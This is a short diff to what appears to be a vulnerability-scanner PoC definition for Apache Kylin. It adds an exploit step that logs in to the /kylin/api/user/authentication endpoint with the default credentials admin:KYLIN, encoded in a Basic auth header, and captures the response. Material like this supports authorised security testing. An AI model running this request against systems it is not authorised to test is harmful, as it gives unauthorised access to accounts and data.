@@ -14,6 +14,7 @@
       "References": [
             "http://wiki.peiqi.tech"
       ],
+	  "HasExp": true,
       "ScanSteps": [
             "AND",
             {
@@ -49,6 +50,25 @@
                         ]
                   },
                   "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/kylin/api/user/authentication",
+                        "follow_redirect": true,
+                        "header": {
+                              "Authorization": "Basic YWRtaW46S1lMSU4=",
+                              "Cookie": "project=null"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+				  "SetVariable": [
+                        "output|lastbody"
+                  ]
             }
       ],
       "PostTime": "2021-01-24 13:23:42",
